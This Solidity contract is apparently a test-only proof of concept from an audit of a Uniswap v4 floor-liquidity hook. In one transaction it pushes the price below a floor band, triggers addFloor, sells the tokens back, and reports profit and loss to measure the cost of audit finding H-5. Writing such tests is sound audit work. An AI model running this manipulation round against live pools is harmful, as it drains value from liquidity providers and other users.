// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFloorPoke {
    function addFloor() external returns (uint128);
}

/// TEST-ONLY. Runs one H-5 "residual" round — push the tick below the floor band, poke addFloor,
/// sell the token straight back — inside a SINGLE transaction, to measure whether the auditor's
/// "single cheap tx, holds no position between commits" cost model is accurate.
contract H5AtomicAttacker {
    uint160 internal constant MAX_LIMIT = 1461446703485210103287273052203988822378723970342 - 1;

    PoolSwapTest public immutable sw;
    IFloorPoke public immutable floor;
    IERC20 public immutable token;
    address public immutable owner;

    constructor(PoolSwapTest sw_, IFloorPoke floor_, IERC20 token_) {
        sw = sw_;
        floor = floor_;
        token = token_;
        owner = msg.sender;
    }

    receive() external payable {}

    /// @return pnl the contract's ETH balance change across the whole round (negative = loss)
    /// @return capital the peak ETH the round had to front on the push leg
    function round(PoolKey calldata key, uint160 pushLimit, uint256 ethForPush) external returns (int256 pnl, uint256 capital) {
        uint256 b0 = address(this).balance;
        // 1) push the tick below floorTickLower (exact-input, stops at the limit)
        sw.swap{value: ethForPush}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(1e30), sqrtPriceLimitX96: pushLimit}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        capital = b0 - address(this).balance;
        // 2) poke — the commit lands here, off a belowSince armed >= MIN_DWELL ago
        floor.addFloor();
        // 3) sell the whole bag straight back through the freshly minted wall
        uint256 bal = token.balanceOf(address(this));
        token.approve(address(sw), bal);
        sw.swap(
            key,
            SwapParams({zeroForOne: false, amountSpecified: -int256(bal), sqrtPriceLimitX96: MAX_LIMIT}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        pnl = int256(address(this).balance) - int256(b0);
    }

    function sweep() external {
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok);
    }
}
